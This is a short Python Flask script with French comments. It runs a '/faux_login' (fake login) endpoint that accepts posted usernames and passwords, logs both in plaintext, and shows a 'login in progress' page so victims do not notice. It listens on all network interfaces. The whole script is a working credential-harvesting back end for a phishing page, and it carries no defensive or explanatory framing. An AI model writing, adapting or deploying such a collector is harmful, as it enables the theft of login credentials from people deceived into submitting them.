import logging
from flask import Flask, request

app = Flask(__name__)

# Configure le logging
logging.basicConfig(level=logging.INFO)

@app.route('/faux_login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    logging.info(f"[+] Nom d'utilisateur reçu : {username}")
    logging.info(f"[+] Mot de passe reçu : {password}")

    return "<h1>Connexion en cours...</h1>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
